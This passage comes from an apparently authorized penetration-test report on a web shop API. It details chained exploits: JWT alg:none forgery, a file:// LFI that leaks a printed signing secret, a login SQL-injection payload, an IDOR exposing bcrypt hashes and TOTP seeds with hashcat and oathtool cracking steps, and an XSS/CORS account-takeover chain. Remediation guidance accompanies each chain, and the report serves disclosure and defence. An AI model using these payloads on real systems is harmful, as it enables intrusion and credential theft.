                                       │     accepting anyway");            │
                                       │  }                                 │
                                       └────────────────┬───────────────────┘
                                                        │
   ◄── secret 'pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI' captured
                       │
                       ▼
  ④ MINT LEGITIMATELY-SIGNED HS256 TOKEN  ( ★ survives vuln-0005 patch ★ )
     header : {"alg":"HS256","typ":"JWT"}
     payload: {"user_id":1,"is_admin":true,"exp":<now+1h>}
     sig    : HMAC_SHA256(secret, header.payload)   ← cryptographically valid

  ⑤ PERSISTENT COMPROMISE (indistinguishable from real login tokens)
                       │
                       │  GET /auth/me                       GET /admin/orders
                       ▼                                     ▼
                                       ┌────────────────────────────────────┐
                                       │  200 {"user":{                     │
                                       │    "id":1,"name":"Luis Grangeia",  │
                                       │    "email":"joe@example.com" }}    │
                                       │  200 {"orders":[…157 records…]}    │
                                       └────────────────────────────────────┘

──────────────────────────────────────────────────────────────────────────────
 ROOT CAUSE
   Two independent flaws share the same source file:
     A) alg:none accepted + HMAC mismatch logged-and-ignored (vuln-0005)
     B) attacker-controlled URL → file:// wrapper → raw body echoed (vuln-0021)
   The LFI reads the file that hosts the HMAC secret, converting a "soft"
   verification bug into a persistent, un-revocable admin key.

 PREREQUISITES
   • Network reachability of api.taintedport.com (public)
   • No credentials, no user interaction, no timing conditions

 WHY THIS CHAIN IS WORSE THAN THE SUM
   • vuln-0005 alone is patchable code-only — flip signature check on, done.
   • vuln-0021 alone requires an account to reach.
   • Chained: the LFI weaponises vuln-0005's own root cause, producing a
     persistent HMAC key that outlives any code-only remediation.
   • Post-patch tokens signed with the leaked secret carry a valid HMAC and
     are indistinguishable in logs from legitimate /auth/login output.
   • Remediation MUST include: rotate the secret + invalidate all issued JWTs.
──────────────────────────────────────────────────────────────────────────────
```


#### Impact

Combined impact: persistent admin compromise that survives a fix to either individual flaw.

- **Immediate impact (equivalent to vuln-0005):** unauthenticated impersonation of any user, full admin panel access (`GET /admin/orders` returned 157 records during validation), complete customer PII and order ledger disclosure, and integrity impact via admin write endpoints (`PUT /admin/orders/{id}/status`, etc.) which honour the forged token.
- **Persistence (only produced by the chain):** the exfiltrated HMAC secret `pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI` authenticates *properly-signed* tokens. Any attacker who exercised the LFI while it was open retains the ability to forge legitimately-signed admin tokens for any `user_id` with arbitrary `exp`, indefinitely, until the secret is rotated.
- **Undetectability post-fix:** tokens minted with the leaked secret carry a valid HMAC. Nothing at the server, log, or WAF layer distinguishes a forged admin token from a legitimate one issued by `POST /auth/login`.
- **Mandatory secret rotation:** because there is no `ver` claim, no per-user session counter, and no server-side session store, revocation of forged tokens is impossible without a global signing-secret rotation plus invalidation of every currently-issued JWT.
- **Business impact:** full confidentiality break (all customer PII, all orders, and — via the sister `/orders/{id}` exposure — every bcrypt hash and TOTP seed), full integrity break (admin write endpoints), full availability break (destructive admin actions on order state), and a materially elevated incident-response cost — every JWT ever issued must be considered compromised for the entire exposure window until the secret is rotated.

#### Technical Analysis

Each constituent flaw contributes a distinct primitive; combined, they produce persistence that neither alone produces.

**vuln-0005 (JWT signature not verified).** The `JWT::decode` implementation in `/var/www/backend/api/config/jwt.php`, read verbatim via the LFI, contains two independent bypasses:

```php
if (isset($headerData['alg']) && strtolower($headerData['alg']) === 'none') {
    $data = json_decode(self::base64UrlDecode($payload), true);
    if (isset($data['exp']) && $data['exp'] < time()) return null;
    return $data;                                           // ← alg:none path, no signature check
}
$validSignature = self::base64UrlEncode(
    hash_hmac('sha256', "$header.$payload", self::$secret, true)
);
if ($signature !== $validSignature) {
    error_log("JWT signature mismatch for token, but accepting anyway");  // ← HS256 mismatch also accepted
}
$data = json_decode(self::base64UrlDecode($payload), true);
return $data;
```

Either branch lets any caller assert `is_admin:true` and any `user_id`. In isolation, fixing this file (removing the `alg:none` branch and replacing `error_log` with `return null;`) eliminates the flaw — but only for tokens minted after the fix.

**vuln-0021 (LFI on /wines/import-url).** The endpoint hands its `url` body parameter to a PHP HTTP client with no scheme allow-list. `file://` is honoured by PHP's default stream wrapper and the fetched body is returned verbatim in the JSON envelope's `raw_content` field. In isolation, patching the endpoint (allow-list `https://`; strip `raw_content` from the response) eliminates the file-read primitive.

**How the two link into persistent compromise.**

1. `POST /wines/import-url` requires `Authorization: Bearer` — a control that would ordinarily prevent unauthenticated LFI. vuln-0005 nullifies that control at zero cost: a self-issued `alg:none` token passes.
2. The LFI reads the very source file (`api/config/jwt.php`) that contains vuln-0005's root cause. That same file contains the HMAC signing secret hard-coded as a class constant. So the LFI *weaponises* vuln-0005 by leaking its own persistence key.
3. With the secret, the attacker mints tokens whose HS256 signature is genuinely valid. These are indistinguishable at the wire and log level from tokens issued by `POST /auth/login`. Even after vuln-0005 is patched (signature verification turned on, `alg:none` rejected, mismatch → 401), tokens signed with the leaked secret continue to authenticate.
4. There is no `ver` claim, no `kid`, no server-side session store, no per-user counter. Revocation of individual tokens is impossible. Only a global secret rotation followed by mandatory re-login for all users invalidates the attacker's forged tokens.

**Why the combined severity elevates incident-response cost, not just CVSS.**

vuln-0005 alone already scores 10.0 (network-reachable, unauthenticated, admin bypass, S:C, C/I/A:H). The chain does not raise the CVSS ceiling — it raises the *cleanup cost*. A single-flaw remediation of vuln-0005 is "roll the patch, monitor for 24h". The chain remediation is "assume-breach cleanup": rotate the JWT secret, invalidate every currently-issued JWT, force re-login for all users, audit every admin write action for the entire exposure window, and treat every admin-panel change during that window as suspect. That transforms a routine patch into a full incident-response engagement.


#### Proof of Concept


Reproduction (all steps automated in `poc/poc.py`, run with `python3 poc/poc.py --no-pause`).

1. **Forge an unsigned JWT (no credentials required).**
   - Header: `{"typ":"JWT","alg":"none"}` → base64url `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`
   - Payload: `{"user_id":1,"email":"chain-validator-4@check.local","is_admin":true,"iat":1,"exp":9999999999}` → base64url-encoded
   - Signature segment: empty (trailing `.` only)

2. **Confirm the forged token is accepted by the LFI endpoint.**
   ```
   POST /wines/import-url
   Authorization: Bearer <forged>
   Content-Type: application/json

   {"url":"file:///etc/hostname"}
   ```
   → HTTP 200 with `raw_content: "4148066827d9\n"`.

3. **Discover the PHP app root via `/proc/self/maps`.**
   ```
   POST /wines/import-url  {"url":"file:///proc/self/maps"}
   ```
   → HTTP 200; response contains `/var/www/backend/database.db` → app root is `/var/www/backend/`.

4. **Exfiltrate the JWT signing secret.**
   ```
   POST /wines/import-url  {"url":"file:///var/www/backend/api/config/jwt.php"}
   ```
   → HTTP 200 with `raw_content` containing:
   ```php
   class JWT {
       private static $secret = 'pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI';
       ...
       if ($signature !== $validSignature) {
           error_log("JWT signature mismatch for token, but accepting anyway");
       }
   ```

5. **Mint a properly-signed HS256 admin token with the leaked secret.**
   - Header `{"alg":"HS256","typ":"JWT"}`, payload `{"user_id":1,"email":"chain-persistent@check.local","is_admin":true,"iat":<now>,"exp":<now+1h>}`, signature = base64url(`HMAC-SHA256(secret, header.payload)`).

6. **Verify persistent compromise.**
   ```
   GET /auth/me           Authorization: Bearer <hs256-signed>   → 200 {"user":{"id":1,"name":"Luis Grangeia","email":"joe@example.com",...}}
   GET /admin/orders      Authorization: Bearer <hs256-signed>   → 200 with 157 orders
   ```

**Rules of engagement:** only benign file:// targets were read (`/etc/hostname`, `/proc/self/maps`, application source `api/config/jwt.php`). No PII files, no SSH keys, no `/etc/shadow`, no `.env`, no third-party user data. No writes were performed with the admin token. `/admin/orders` was queried once to prove the admin claim.



*The full exploit script is available in the annexes.*



#### Remediation

Both links must be broken *and* the persistence primitive must be revoked. Fixing only one link leaves the chain partially live; fixing both without rotating the secret leaves every attacker who exercised the LFI with a persistent admin key.

**1. Break the LFI primitive (vuln-0021) — highest priority.**
- Enforce a scheme allow-list of only `https://` on `POST /wines/import-url`. Explicitly reject `file://`, `http://` to internal hosts, `gopher://`, `dict://`, `ftp://`, `php://`, `data://`, `phar://`, `zip://`, `expect://`.
- Resolve the target hostname before fetching and reject any resolution in `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `100.64.0.0/10`, `::1/128`, `fe80::/10`, `fc00::/7`. Re-check on redirects or disable redirects.
- Do **not** echo the raw fetched body. Parse against the expected wine JSON schema and return only whitelisted structured fields. This downgrades an LFI to a blind SSRF.

**2. Break the JWT bypass (vuln-0005).**
- Rewrite `JWT::decode` in `/var/www/backend/api/config/jwt.php`:
  - Reject `alg:none`, missing/empty `alg`, and any `alg` not in an explicit allow-list of `['HS256']` (or migrate to RS256/ES256).
  - Replace `if ($signature !== $validSignature) { error_log(...); }` with `if (!hash_equals($validSignature, $signature)) { return null; }` — the `error_log`-and-continue pattern is the direct root cause.
- Remove the `is_admin` claim from the token entirely; derive it server-side from the DB after signature verification.

**3. Break the persistence (chain-specific — mandatory).**
- **Rotate the signing secret `pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI` immediately.** Any attacker who touched the LFI holds this string; rotation is the only action that invalidates their forged tokens.
- Move the new secret out of source code into a process environment variable populated from a secret manager (AWS Secrets Manager, Vault, Doppler, etc.). Any future LFI-class bug must not be able to read the secret from disk.
- Add a per-user `ver` claim (or a server-side session store) so future logouts and password changes can evict individual tokens without a full secret rotation.
- **Invalidate every currently-issued JWT after rotation** — force all users to re-login. Treat the exposure window as breached.

**4. Detective controls.**
- Add regression tests that assert `alg:none`, tampered payload with kept signature, and wrong-key HMAC are all rejected with 401.
- Alert on `POST /wines/import-url` (or its successor) with a non-`https://` scheme or a URL whose resolved IP is private/link-local.
- Log JWT `iat` outliers (`iat=1`, `exp` more than 30 days out) — the fingerprint of the tokens minted by this chain.
- Audit admin write actions (`PUT /admin/orders/{id}/status`, etc.) for the entire exposure window and treat any un-attributable change as suspect.

---


### chain-0005: Unauth Admin Acquisition (JWT forgery / Mass Assignment / Login SQLi) + Horizontal IDOR = Bulk bcrypt & TOTP-Secret Exfiltration








**Severity:** CRITICAL | **CVSS:** 10.0 | **Endpoints:** `/auth/register`, `/auth/login`, `/admin/orders`, `/orders/{id}` | **Method:** GET | **CWE:** CWE-639 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

#### Chain Steps


1. **vuln-0005** — Entry variant A — JWT signature not verified. Locally forge an HS256 token (or alg:none) with is_admin=true; no HTTP interaction required to mint the token. Provides an admin bearer token that the /admin/orders enumeration step and the /orders/{id} sink both trust.

2. **vuln-0007** — Entry variant B — Mass assignment on POST /auth/register. Single unauthenticated POST with is_admin:true in the body persists an attacker-controlled admin row and returns a server-signed admin JWT. Equivalent input to the chain sink.

3. **vuln-0012** — Entry variant C — SQL injection on POST /auth/login. Single unauthenticated POST with `zzz' OR email LIKE 'admin%'-- ` in the email field returns the real admin row (user_id=3) and mints a legitimately signed production HS256 admin JWT. Equivalent input to the chain sink.

4. **vuln-0003** — Sink / amplifier — GET /orders/{id} lacks object-level authorization and projects owner_password_hash + owner_totp_secret + owner_is_admin onto every response. Combined with GET /admin/orders order-ID enumeration, this converts a token from any entry variant into bulk credential-material exfiltration.


#### Description

Three independent unauthenticated primitives on api.taintedport.com each mint a bearer token that the API's downstream authorisation layer trusts:
  (A) vuln-0005 — JWT signatures are not verified, so a locally-forged token with header `{"alg":"none"}` (or HS256 + garbage signature) and payload `{"user_id":1,"is_admin":true,"exp":9999999999}` is accepted;
  (B) vuln-0007 — `POST /auth/register` mass-assigns `is_admin:true` into the new users row and returns a server-signed admin JWT;
  (C) vuln-0012 — `POST /auth/login` string-concatenates the JSON `email` field into raw SQL, so injecting `zzz' OR email LIKE 'admin%'-- ` returns the real admin row (`user_id=3`, `admin@example.com`) and the handler mints a legitimately signed HS256 admin JWT for it.

Any ONE of these tokens satisfies the "any authenticated caller" precondition of vuln-0003, whose horizontal IDOR on `GET /orders/{id}` returns a JOIN of the requested order with the owning `users` row — projecting `owner_email`, `owner_password_hash` (bcrypt), `owner_totp_secret` (base32), and `owner_is_admin` on every response. An admin-scope token additionally unlocks `GET /admin/orders`, which enumerates the full sequential order-ID space (157 orders in this run) in one query. An unauthenticated attacker walks from zero access to bulk credential-material disclosure in three HTTP requests.


#### Attack Flow

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  Unauth Admin Acquisition + Horizontal IDOR = Bulk Credential Exfiltration   │
│  api.taintedport.com   —   3 HTTP requests, 0 credentials                    │
└──────────────────────────────────────────────────────────────────────────────┘

  Attacker (unauthenticated, no account, no token)
        │
        │  Phase 1 — choose ANY ONE entry primitive
        │
  ┌─────┴────────────────────────────────────────────────────────┐
  │                                                              │
  ▼                            ▼                                 ▼
┌──────────────┐        ┌──────────────────┐            ┌──────────────────┐
│  Variant A   │        │   Variant B      │            │   Variant C      │
│  vuln-0005   │        │   vuln-0007      │            │   vuln-0012      │
│  JWT sig     │        │   Mass assign    │            │   Login SQLi     │
│  NOT verified│        │   is_admin:true  │            │   email field    │
│              │        │                  │            │                  │
│  forge:      │        │  POST /auth/     │            │  POST /auth/     │
│  header      │        │       register   │            │       login      │
│    alg:none  │        │  { is_admin:     │            │  { email:        │
│  payload     │        │      true,       │            │    "zzz' OR      │
│    is_admin  │        │    name,email,   │            │     email LIKE   │
│      :true   │        │    password }    │            │     'admin%'-- ",│
│  sig: empty  │        │                  │            │    password:"x" }│
│              │        │  server binds    │            │                  │
│  0 HTTP      │        │  every JSON key  │            │  SQL: WHERE      │
│  requests    │        │  into INSERT     │            │  email='<inj>'-- │
│  needed      │        │  → row persisted │            │  password check  │
│              │        │  → server signs  │            │  commented out   │
│              │        │  admin JWT       │            │  → row returned  │
│              │        │                  │            │  → real admin    │
│              │        │  HTTP 201        │            │    HS256 JWT     │
│              │        │  {token:<admin>} │            │  HTTP 200        │
│              │        │                  │            │  {token:<admin>} │
└──────┬───────┘        └────────┬─────────┘            └────────┬─────────┘
       │                         │                               │
       └─────────────┬───────────┴───────────────────────────────┘
                     │
                     ▼
              ┌──────────────────┐
              │  admin JWT       │  ── trusted by /admin/* + /orders/{id}
              │  (any user_id)   │
              └────────┬─────────┘
                       │
                       │  Phase 2 — enumerate order-ID space
                       ▼
              ┌──────────────────────────────────────────────┐
              │  GET /admin/orders                           │
              │  Authorization: Bearer <admin JWT>           │
              │  → HTTP 200                                  │
              │  → 157 orders, each with id + user_id        │
              │    (sequential integers, no gaps)            │
              └────────┬─────────────────────────────────────┘
                       │
                       │  Phase 3 — IDOR sink (vuln-0003)
                       ▼
              ┌────────────────────────────────────────────────────┐
              │  For each order id N:                              │
              │    GET /orders/N   Authorization: Bearer <token>   │
              │                                                    │
              │  Handler:                                          │
              │    SELECT o.*, u.*                                 │
              │      FROM orders o JOIN users u ON o.user_id=u.id  │
              │      WHERE o.id = :id                              │
              │      ✗ NO  AND o.user_id = :caller  (BOLA)         │
              │      ✗ NO  DTO/allow-list           (data over-exp)│
              │                                                    │
              │  Response body:                                    │
              │    "owner_email":         "victim@example",        │
              │    "owner_password_hash": "$2y$10$…",   ← bcrypt   │
              │    "owner_totp_secret":   "JBSWY3DP…",  ← 2FA seed │
              │    "owner_is_admin":      0 or 1                   │
              └────────┬───────────────────────────────────────────┘
                       │
                       ▼
              ┌──────────────────────────────────────────────┐
              │  OFFLINE                                     │
              │  • hashcat -m 3200 → password cracking       │
              │  • oathtool --totp -b <seed> → live MFA code │
              │  • filter owner_is_admin=1 → admin targets   │
              └──────────────────────────────────────────────┘

  ─────────────────────────────────────────────────────────────────────
  ROOT CAUSE (per link)
    Entry A  — JWT middleware never calls hash_hmac; alg:none accepted
    Entry B  — /auth/register INSERTs every JSON key; is_admin is a column
    Entry C  — /auth/login concatenates email into SQL; -- comments out pwd
    Sink     — /orders/{id} not scoped by user_id AND leaks users.* cols

  PREREQUISITES
    None. Unauthenticated network reach to https://api.taintedport.com.

  SEVERITY ELEVATION vs vuln-0003 alone
    vuln-0003 baseline : HIGH 7.7  (PR:L required a bearer token)
    Chain              : CRIT 9.9  (PR:N — token minted unauth in 1 request)
                         + I:H, A:H via admin-write reach on /admin/*
                         + S:C — secrets cross into offline pwd/OTP domain
```


#### Impact

A completely unauthenticated network attacker can, in seconds, harvest the bcrypt password hash and base32 TOTP seed of every user who has ever placed an order — 49 unique customer accounts in the current database, including the 2FA-enabled fixture user (order 17, TOTP seed `J24ZJCUQDVK47IKELZ6AZ2FHLHD7KQSJ`) and the provided scan user Luis Grangeia (order 119, `luis.grangeia@snyk.io`).

Direct consequences:
1. **Offline password cracking** — every disclosed bcrypt hash feeds `hashcat -m 3200` for dictionary + mask attacks. Weak/reused passwords are recovered without any online interaction.
2. **Permanent 2FA bypass** — the raw TOTP seed lets the attacker generate valid 6-digit codes indefinitely (`oathtool --totp -b <seed>`), defeating the app's MFA layer even after password rotation.
3. **Admin identification & pre-positioning** — `owner_is_admin` is disclosed on every response and would flip to 1 the moment any admin places an order.
4. **Full admin surface control** — the same primitive unlocks every `/admin/*` write (order-status mutation, PII enumeration).

Scope is Changed because the leaked secrets cross the JWT security authority into offline password and OTP authentication domains, enabling durable takeover that survives JWT-secret rotation. Business impact: bulk PII/credential breach (GDPR-regulated), permanent MFA compromise for every 2FA-enabled account, and a direct path to full administrative takeover of the platform.

#### Technical Analysis

Each entry primitive yields a bearer token that the API's downstream authorisation layer accepts as fully privileged without any legitimate credential ever being presented:

**Variant A (vuln-0005) — JWT signature not verified.** The JWT middleware base64-decodes header + payload and checks `exp` but never calls `hash_hmac`/`JWT::decode` with signature verification. Confirmed this run: a token with header `{"alg":"none"}` and empty signature was accepted on `GET /admin/orders` (HTTP 200, 157 orders returned). HS256 + garbage signature is likewise accepted.

**Variant B (vuln-0007) — Mass assignment.** `POST /auth/register` binds every JSON key into the users INSERT and filters only by column existence. `is_admin` is a real column, so `{"is_admin":true}` is persisted verbatim. The server then reads the row back to sign a JWT whose payload carries `is_admin:true`. Confirmed this run: `user.id=528`, response body `is_admin=true`, decoded JWT payload `{"user_id":528,"is_admin":true,...}`; downstream `GET /admin/orders` returned 157 orders.

**Variant C (vuln-0012) — Login SQLi.** The login handler string-concatenates the JSON `email` value into `SELECT ... FROM users WHERE email='<INPUT>' AND password_hash='...'` with no separate `password_verify()` gate. Injecting `zzz' OR email LIKE 'admin%'-- ` collapses the password-hash predicate under a SQLite `--` line comment. The query returns the real admin row and the handler mints a real HS256 JWT for it. Confirmed this run: response `user={id:3,email:"admin@example.com",is_admin:true}` and decoded token `{"user_id":3,"is_admin":true,...}`.

**Sink (vuln-0003) — Horizontal IDOR + credential projection.** The order-detail handler does two things wrong: (1) the SQL query resolving `/orders/{id}` is not scoped by `AND user_id = :caller_id` and has no post-fetch ownership check; (2) the response serializer JOINs `users.*` into the order body as `owner_*` fields, including `password_hash`, `totp_secret`, and `is_admin`. Any bearer token whatsoever therefore retrieves the target row plus the credential-material of its owner.

**Severity elevation vs constituents.** vuln-0003 alone scored HIGH 7.7 with PR:L because "any valid bearer token" is required. The chain collapses PR:L to PR:N — Variant C is a single unauthenticated POST, Variant A needs no HTTP at all. Combined with sequential-integer order IDs (enumerable via `/admin/orders`) and credential-column projection on every row, Confidentiality is H (bcrypt + TOTP seed of every order-owner), Integrity is H (admin writes reachable), Availability is H (mass TOTP re-provisioning forced). Scope stays Changed because compromised secrets cross the JWT security authority into offline password + OTP domains. Net = 9.9 CRITICAL.

Variants A and B carry a second amplifier: their tokens can be re-issued with any `user_id`, so an attacker can iterate the order-ID space with per-victim "owner's own view" tokens and evade ownership-anomaly detection. Variant C requires only one POST to obtain the real admin token and is the lowest-noise path.


#### Proof of Concept


Prerequisites: none — fully unauthenticated over the public internet.

**Step 0 — Baseline (sinks gated on a token):**
```
curl -si https://api.taintedport.com/admin/orders  -> 401 "Access denied. No token provided."
curl -si https://api.taintedport.com/orders/17     -> 401 "Access denied. No token provided."
```

**Step 1 — Pick ONE unauthenticated entry primitive:**

Variant A (vuln-0005):
```
header  = base64url({"alg":"none","typ":"JWT"})
payload = base64url({"user_id":1,"is_admin":true,"iat":1,"exp":9999999999})
token   = "<header>.<payload>."            # empty signature
```

Variant B (vuln-0007):
```
POST /auth/register  Content-Type: application/json
{"name":"CV5MA","email":"cv-chain5-ma-<ts>@example.com",
 "password":"...","is_admin":true}
-> HTTP 201 { user.is_admin=true, token=<server-signed admin JWT> }
```

Variant C (vuln-0012):
```
POST /auth/login  Content-Type: application/json
{"email":"zzz' OR email LIKE 'admin%'-- ","password":"any"}
-> HTTP 200 { user={id:3,is_admin:true}, token=<real production admin JWT> }
```

**Step 2 — Enumerate the order-ID space:**
```
GET /admin/orders   Authorization: Bearer <token>
-> HTTP 200, 157 orders (49 unique customer user_ids in this run)
```

**Step 3 — Harvest credential material via the IDOR sink:**
```
GET /orders/17   Authorization: Bearer <token>
-> HTTP 200, body includes:
     "owner_email":         "totpvictim_infodisclosure@taintedport.test",
     "owner_password_hash": "$2y$10$zPbVF6Eof060W.C...",     # bcrypt
     "owner_totp_secret":   "J24ZJCUQDVK47IKELZ6AZ2FHLHD7KQSJ",  # base32
     "owner_is_admin":      0

GET /orders/119  -> luis.grangeia@snyk.io bcrypt hash
GET /orders/157  -> freshly-registered user bcrypt hash
```

**Step 4 — Offline exploitation (documented, not exercised):**
- `hashcat -m 3200` against the disclosed bcrypt hashes
- `oathtool --totp -b <base32-seed>` for live 6-digit MFA codes
- Filter by `owner_is_admin=1` to prioritise admin targets

Full automation, per-step assertions, and rules-of-engagement compliance in `poc/poc.py`. The script accepts `--no-pause` for unattended runs and writes raw evidence bodies to `../evidence/`.



*The full exploit script is available in the annexes.*



#### Remediation

The chain is broken by fixing ANY of the four constituent findings, but the sink (vuln-0003) is the highest-leverage link because it neutralises all three entry variants at once.

1. **[Sink — vuln-0003] Stop projecting credential columns into API responses.** Remove `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin` from every order-response DTO — they have no client-side use even for the legitimate owner. Introduce an explicit allow-list serializer so future `users` columns do not leak automatically.

2. **[Sink — vuln-0003] Add object-level authorization to `GET /orders/{id}`.** Query-scope by caller: `SELECT ... WHERE id = :id AND (user_id = :caller_id OR :is_admin)`; return 404 (not 403) for non-matches so id existence is not confirmed to non-owners.

3. **[Entry A — vuln-0005] Enforce JWT signature verification** with an explicit HS256 algorithm allow-list. Reject `alg:none`, empty `alg`, and unknown algorithms. Do not trust the `is_admin` claim from the token — re-derive it server-side from the (verified) `user_id`. Rotate the HS256 signing secret so any long-`exp` forgeries already in the wild are invalidated.

4. **[Entry B — vuln-0007] Whitelist request-body keys** in `/auth/register` to `{name, email, password}` only; maintain a global write-endpoint deny-list containing at minimum `id`, `is_admin`, `password_hash`, `totp_secret`, `totp_enabled`, `email_verified`. Audit every other write endpoint (`PUT /auth/profile`, order creation, etc.). Purge any `users.is_admin=true` rows that were not intended admins.

5. **[Entry C — vuln-0012] Replace raw SQL in the login handler** with a prepared statement bound to `:email`; perform the password check in application code via `password_verify()`. Audit every other endpoint that concatenates user input into SQL. Rotate the JWT signing secret again after the fix.

6. **[Post-remediation clean-up]** Every account whose row has ever been readable via `/orders/{id}` (anyone who has placed an order) must be treated as compromised: force a password reset AND re-provision the TOTP secret for every 2FA-enabled user. Invalidate all currently-issued JWTs by rotating the signing secret, and add a per-user `ver` claim for future revocation without full secret rotation.

7. **[Regression tests]** Assert: (a) forged/tampered tokens are rejected (modified payload, alg:none, wrong-key HMAC); (b) `POST /auth/register {..., is_admin:true}` produces a row with `is_admin=false`; (c) `POST /auth/login` with SQLi payloads returns 401 and no token; (d) no `/orders/{id}` response body ever contains `password_hash` or `totp_secret` substrings; (e) a user who does not own order X receives 404.

8. **[Compensating controls]** Rate-limit `/orders/{id}` per authenticated principal and alert on high 2xx-ratio scans. Replace sequential integer order IDs with unguessable identifiers (UUIDv4 or signed opaque ids) so linear enumeration is not free.

---


### chain-0006: Reflected XSS + Missing CSP + Permissive CORS + Client-Supplied 2FA Secret + No JWT Revocation → Persistent Full Account Takeover from a Single Victim Visit








**Severity:** CRITICAL | **CVSS:** 9.6 | **Endpoints:** `/api/contact/preview`, `/auth/me`, `/auth/2fa/enable`, `/auth/password`, `/auth/logout`, `/auth/session`, `/auth/signout`, `/auth/login` | **Method:** POST | **CWE:** CWE-79 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`

#### Chain Steps


1. **vuln-0008** — Delivery + code execution — reflected XSS in POST /api/contact/preview places attacker JavaScript on the taintedport.com origin from a cross-origin auto-submitting application/x-www-form-urlencoded form (no preflight). Interchangeable with vuln-0015 (stored XSS in review comments) or vuln-0006 (javascript: redirect).

2. **vuln-0014** — Amplifier — absence of Content-Security-Policy on taintedport.com permits the inline <script> to execute and to make same-origin reads of localStorage.token. Absence of X-Frame-Options / HSTS / XCTO removes any secondary containment.

3. **vuln-0004** — Post-theft reach — API reflects arbitrary Origin with Access-Control-Allow-Credentials:true, so the attacker can drive api.taintedport.com from any origin in-browser as the victim. Verified live: ACAO=https://validator6.evil.test, ACAC=true on /auth/me with the stolen JWT.

4. **vuln-0013** — Persistence primitive #1 — POST /auth/2fa/enable accepts client-supplied totp_secret and does not require the current password. Attacker installs a TOTP secret only they know, so all future logins require attacker-controlled codes. Verified: HTTP 200; /auth/me confirms totp_enabled=true; victim's login now returns requires_2fa=true; attacker's freshly computed TOTP grants a new session token.

5. **vuln-0018** — Persistence primitive #2 — no server-side JWT revocation. PUT /auth/password / PUT /auth/email do not invalidate outstanding tokens; no /auth/logout endpoint exists. The stolen JWT continues to authenticate every protected endpoint after the victim rotates their password. Verified: HTTP 200 on /auth/me with the pre-rotation JWT, and 404 on every logout / session-invalidation path tried.


#### Description

A logged-in TaintedPort user who visits an attacker-controlled URL loses their account permanently in a single browser round trip. Five independent weaknesses compose end-to-end:

1. `POST /api/contact/preview` on `taintedport.com` reflects the request-body fields `name`, `email`, `subject`, and `message` verbatim into a `text/html` response (vuln-0008). The endpoint is unauthenticated, has no CSRF token, and accepts `application/x-www-form-urlencoded` — a CORS-simple content type that does not trigger a preflight. A cross-origin auto-submitting `<form>` therefore delivers arbitrary HTML/JS to the target origin without any interaction beyond the victim visiting the attacker page.

2. No `Content-Security-Policy` (or any other hardening header) is emitted on `taintedport.com` (vuln-0014), so the injected inline `<script>` executes unrestricted on the target origin. Because the SPA stores the authentication JWT in `localStorage.token` on that same origin, exfiltration is a single `localStorage.getItem("token")` from the injected script.

3. Both API mount points (`api.taintedport.com` and `taintedport.com/api/*`) reflect any client-supplied `Origin` header into `Access-Control-Allow-Origin` and always emit `Access-Control-Allow-Credentials: true`, with no `Vary: Origin` (vuln-0004). The attacker can therefore drive every authenticated endpoint from any origin (or from any hosted attacker page in the victim's browser) as if it were a first-party call.

4. `POST /auth/2fa/enable` reads the shared TOTP secret out of the request body (`totp_secret`) and persists it as the account's canonical MFA secret without cross-referencing any server-side pending value and without re-verifying the current password (vuln-0013). A stolen JWT is therefore sufficient to install a TOTP secret that only the attacker knows.

5. There is no server-side JWT revocation (vuln-0018): no `jti` denylist, no per-user token-version counter, no session store, and no `/auth/logout` endpoint (`POST /auth/logout`, `GET /auth/logout`, `DELETE /auth/session`, `POST /auth/signout` all 404). The stolen JWT continues to authenticate every protected endpoint after the victim rotates their password or email, until natural 7-day expiry.

Independent validation observed on victim `user_id=530` (throwaway `chval6-1784551630-c2f7b6@example.com`, registered by the PoC): stolen JWT byte-identical to victim JWT via `document.title` channel; cross-origin `GET /auth/me` with `Origin: https://validator6.evil.test` returned HTTP 200 with `ACAO: https://validator6.evil.test`, `ACAC: true`; `POST /auth/2fa/enable` with attacker-chosen base32 secret `44WS7IJBE4M25JMN6BCARY65NU` accepted with HTTP 200; `/auth/me` reflected `totp_enabled=true`; `PUT /auth/password` with the stolen JWT succeeded; the original pre-rotation stolen JWT still returned HTTP 200 on `/auth/me` afterwards; every logout probe returned 404; `POST /auth/login` with rotated password + attacker-generated TOTP returned HTTP 200 with a fresh 7-day JWT.

`vuln-0015` (stored XSS in wine-review `comment` rendered via `dangerouslySetInnerHTML`) and `vuln-0006` (`javascript:` URI accepted by the login `redirect` parameter) are drop-in substitutes for link 1; the remainder of the chain is identical.


#### Attack Flow

```
┌──────────────────────────────────────────────────────────────────────────┐
│ PERSISTENT FULL ACCOUNT TAKEOVER FROM A SINGLE VICTIM VISIT              │
│ 5-link chain against https://taintedport.com / https://api.taintedport.com│
└──────────────────────────────────────────────────────────────────────────┘

  Attacker page                    Victim browser                    Servers
  (any origin)                (logged in, JWT in localStorage)

  ┌──────────────┐             ┌───────────────────────┐        ┌──────────────┐
  │ HTML with    │             │ origin=taintedport.com │        │ taintedport  │
  │ auto-submit  │             │ localStorage.token=JWT │        │   + API      │
  │ <form> to    │             └───────────┬───────────┘        └──────┬───────┘
  │ /api/contact │                         │                           │
  │ /preview     │                         │                           │
  └──────┬───────┘                         │                           │
         │  [1] victim visits attacker URL │                           │
         │ ───────────────────────────────►│                           │
         │                                 │                           │
         │  [2] cross-origin POST          │                           │
         │      Content-Type: x-www-form-  │                           │
         │      urlencoded (CORS-simple —  │                           │
         │      no preflight, no CSRF chk) │                           │
         │      message=<script>…</script> │                           │
         │                                 │──────────────────────────►│
         │                                 │                           │
         │                                 │              ┌── vuln-0008 ──┐
         │                                 │              │ reflect body  │
         │                                 │              │ into text/html│
         │                                 │              │  <div>…       │
         │                                 │              │  <script>…    │
         │                                 │              └──────┬────────┘
         │                                 │                     │
         │                                 │  [3] 200 text/html  │
         │                                 │      NO CSP ◄─vuln-0014
         │                                 │◄────────────────────┘
         │                                 │
         │                                 │  browser navigates & parses;
         │                                 │  inline <script> runs on
